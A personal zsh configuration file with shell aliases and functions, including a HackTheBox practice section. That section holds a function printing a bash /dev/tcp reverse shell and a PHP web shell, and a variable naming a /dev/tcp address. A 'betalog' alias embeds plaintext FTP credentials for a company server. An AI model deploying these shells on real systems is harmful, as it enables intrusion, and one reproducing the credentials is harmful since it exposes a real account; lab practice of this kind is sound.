#
# ~/.zshrc
#

# If not running interactively, don't do anything
[[ $- != *i* ]] && return

# cat ~/.cache/wal/sequences
#system
alias ls='exa --git --icons'
alias ll='exa --git --icons --long --octal-permissions'
alias lla='exa --git --icons --long --all --all --octal-permissions'
alias tree='exa --git --icons --tree'
alias bashrc='edtw ~/.bashrc'
alias zshrc='edtw ~/.zshrc'
alias py='python3 '
alias gip='ip a | grep 192.168 | awk "{print \$2}"'
alias syst='sudo systemctl start'
alias sysr='sudo systemctl restart'
alias syso='sudo systemctl stop'
alias sysa='sudo systemctl status'
alias mhost='sudo micro /etc/hosts'
alias sshn='ssh js@192.168.1.37'
alias dotfiles='cd /home/js/.config/dotfiles'
alias bridge='cd /home/js/bridge'
alias rs='source /home/js/.zshrc'
alias xterm-kitty='kitty'
function memusage() top -o %MEM -b -n1 | tail +8 | head -n ${1:-6} | awk '{print toupper( substr( $12, 1, 1 ) ) substr( $12, 2 )" "$10"%"}'
function cpusage() top -o %CPU -b -n1 | tail +8 | head -n ${1:-6} | awk '{print toupper( substr( $12, 1, 1 ) ) substr( $12, 2 )" "$9"%"}'
#pacman
alias get='sudo pacman -S'
alias rem='sudo pacman -R'
alias srch='pacman -Ss'
alias lstin="pacman -Qi | sed '/^Name/{ s/  *//; s/^.* //; H;N;d}; /^URL/,/^Build Date/d; /^Install Reason/,/^Description/d; /^  */d;x; s/^.*: ... //; s/Jan/01/;  s/Feb/02/;  s/Mar/03/;  s/Apr/04/;  s/May/05/;  s/Jun/06/;  s/Jul/07/;  s/Aug/08/; s/Sep/09/; s/Oct/10/;  s/Nov/11/;  s/Dec/12/; / [1-9]\{1\} /{ s/[[:digit:]]\{1\}/0&/3 }; s/\(^[[:digit:]][[:digit:]]\) \([[:digit:]][[:digit:]]\) \(.*\) \(....\)/\4-\1-\2 \3/' | sed ' /^[[:alnum:]].*$/ N; s/\n/ /; s/\(^[[:graph:]]*\) \(.*$\)/\2 \1/'"
#apt
alias aget='sudo apt install'
alias arem='sudo apt remove'
#qtile
alias qtilec='edtw ~/.config/qtile/config.py'
alias qtilee='cat ~/.local/share/qtile/qtile.log | tail -n 40 | bat -l log'
alias fqkey='bat ~/.config/qtile/keys | grep'
#yay
alias yget='yay -S'
alias yrem='yay -R'
#snap
alias srem='sudo snap remove'
alias sget='sudo snap install'
#svn
alias svnni="svn st | sed -e \"/^--- Changelist 'ignore'/,/^--- Changelist/d\" | grep '^[ADMR!]' | awk '{print \$2}'"
alias svndiff="svnni | xargs svn diff | bat -l patch"
#kipin
alias kipin='~/.customscripts/kipin/init'
alias betalog='initial_path=$(pwd) && cd /tmp && wget ftp://logsbeta%2540dattacargo.com:LogsBeta.2021@dattacargo.com/prod.log && cat ./prod.log | tac | head | bat -l log && rm ./prod.log && cd $initial_path'
alias migrate='php bin/console doctrine:migrations:migrate'
alias mkmigration="php bin/console make:migration | grep \"new migration\" | awk -F'\"' '{print \$2}'"
#resets
alias kds='pkill -f discord; pkill -f Discord'
alias klol='pkill -f lutris'
//Functions
toggleprompt(){
	if [ "$PS1" \=\= "$FULL_PROMPT" ]; then
		export PS1=$MIN_PROMPT
	else
		export PS1=$FULL_PROMPT
	fi
}

function dumprow () {
	if [[ $# -eq 0 ]] then
		echo 'No params supplied'
	elif [[ $# -eq 1 ]] then
		mysqldump --compact -u js dattacargo33 -t "$1"
	elif [[ $# -eq 2 ]] then
		mysqldump --compact -u js dattacargo33 -t "$1" --where "$2"
	else
		echo 'Only 1 or 2 params accepted'
	fi
}

oak () { "$@" & disown & exit; }

#msf
alias msfconsole="msfconsole -x \"db_connect js@msf\""
#nvm
alias nvmi="source /usr/share/nvm/init-nvm.sh;nvm use 12.14"

### Hacking 
export tip='1.2.3.4'

alias htbi="sudo openvpn ~/hacking/hackthebox/htb-vpn.ovpn"
alias getp="cat open | grep -oE '[0-9]+/'  | tr -d '/' | tr '\n' ','| xargs | xclip -sel c -r"

# Update Target IP
function uptip(){
	sed -i --follow-symlinks "s/^export tip='.*/export tip='$1'/g" /home/js/.zshrc;
	export tip="$1";
}

# Get tun0 ip
function gtunip(){
	ip a | grep -A3 tun0 | grep inet | awk '{print $2}' | cut -d '/' -f 1 | head -n 1
}

# HackTheBox machine creator
function htbc() {
	#Variables
	machine_name="$1"
	machine_lowername="$(echo $1 | awk '{print tolower($0)}')"
	machine_ip="$2"

	#Creating machine directories
	mkdir "/home/js/hacking/hackthebox/machines/$machine_lowername"
	cd "$_";
	mkdir recon content exploit
	
	#Creating obsidian writeup and symlink
	touch writeup.md
	ln -s $(pwd)/writeup.md "/home/js/documents/obsidian/Hacking/Machines/HackTheBox - $machine_name"

	#Cd into recon and updating target ip
	cd recon;
	uptip $machine_ip;
}

# Reverse shell generator
function grev(){
	# Switch case for reverse shell type
	case $1 in
		"php")
			echo "<?php echo '<pre>' . shell_exec(\$_GET['cmd']) . '</pre>'; ?>";
			;;
		*)
			# Fallback to bash reverse shell
			echo "bash -c 'bash -i >& /dev/tcp/$(gtunip)/1233 0>&1'"
			;;
	esac
			
}

#python
alias pysv="sudo python -m http.server 9000"
#php
alias php='php72'
alias phpc='sudo micro /etc/php72/php.ini'
#apache
alias httpdc="sudo micro /etc/httpd/conf/httpd.conf"
#discord
alias rsds='pkill Discord && discord & disown && sleep 1 && exit'
#Custom Scripts
alias ocr="/home/js/.customscripts/ocr-selection"

#prompts
FULL_PROMPT=$' %{\e[1;3;35m%}%~ %{\e[31m%} %{\e[0%}m'
MIN_PROMPT=$' %{\e[1;31m%} %{\e[0%}m'
PS1=$FULL_PROMPT
PS2=$MIN_PROMPT

#Variables
export LC_ALL="C"
export EDITOR=micro
export BROWSER=firefox
export TESSDATA_PREFIX='/usr/share/tessdata/'
export dotfiles='/home/js/.config/dotfiles'
export dirlist='/home/js/hacking/wordlists/dirbuster/directory-list-2.3-medium.txt'
#bridge
export nb="$(cat /home/js/bridge/data/nb/public-ip)"
export lnb="$(cat /home/js/bridge/data/nb/private-ip)"
export pc="$(cat /home/js/bridge/data/pc/public-ip)"
export lpc="$(cat /home/js/bridge/data/pc/private-ip)"


OPERAPLUGINWRAPPER_PRIORITY=0
OPERA_KEEP_BLOCKED_PLUGIN=1
GDK_NATIVE_WINDOWS=1
trabu='/dev/tcp/25.5.126.209/1233'
PATH="/usr/NX/bin/:${dotfiles}/customscripts:/opt/lampp:/home/js/perl5/bin${PATH:+:${PATH}}"; export PATH;
PERL5LIB="/home/js/perl5/lib/perl5${PERL5LIB:+:${PERL5LIB}}"; export PERL5LIB;
PERL_LOCAL_LIB_ROOT="/home/js/perl5${PERL_LOCAL_LIB_ROOT:+:${PERL_LOCAL_LIB_ROOT}}"; export PERL_LOCAL_LIB_ROOT;
PERL_MB_OPT="--install_base \"/home/js/perl5\""; export PERL_MB_OPT;
PERL_MM_OPT="INSTALL_BASE=/home/js/perl5"; export PERL_MM_OPT;
shopt -s checkwinsize

#History
export HISTCONTROL=ignoredups:erasedups  # no duplicate entries
export HISTSIZE=100000                   # big big history
export HISTFILESIZE=100000               # big big history
export SAVEHIST=100000 					 # big big history
shopt -s histappend                      # append to history, don't overwrite it
# Appends every command to the history file once it is executed
setopt inc_append_history
# Reloads the history whenever you use it
setopt share_history
# Save and reload the history after each command finishes
# export PROMPT_COMMAND="history -a; history -c; history -r; $PROMPT_COMMAND"

HISTFILE=~/.zsh_history


#BINDKEYS
bindkey  "^[[H"   beginning-of-line
bindkey  "^[[F"   end-of-line
bindkey  "^[[3~"  delete-char
bindkey "^d" kill-path-word

banner

export FZF_DEFAULT_OPS='-x -i'
export FZF_DEFAULT_COMMAND='fd --type f --hidden --follow --exclude .Android --exclude snap --exclude .git --exclude .cache --exclude cache --exclude .vscode-oss --exclude .svn --exclude node-modules --exclude composer --exclude build'
export FZF_CTRL_T_COMMAND="$FZF_DEFAULT_COMMAND"
#zsh plugins/functions
[ -f ~/.fzf.zsh ] && source ~/.fzf.zsh

source ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh
source ~/.zsh/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh

function kill-path-word()
{
  local words word spaces
   zle set-mark-command                 # save current cursor position ("mark")
   while [[ $LBUFFER[-1] == "/" ]] {
     (( CURSOR -= 1 ))                  # consume all trailing slashes
  }
  words=("${(s:/:)LBUFFER/\~/_}")       # split command line at "/" after "~" is replaced by "_" to prevent FILENAME EXPANSION messing things up
  word=$words[-1]                       # this is the portion from cursor back to previous "/"
  (( CURSOR -= $#word ))                # then, jump to the previous "/"
  zle exchange-point-and-mark           # swap "mark" and "cursor"
  zle kill-region                       # delete marked region
}
zle -N kill-path-word

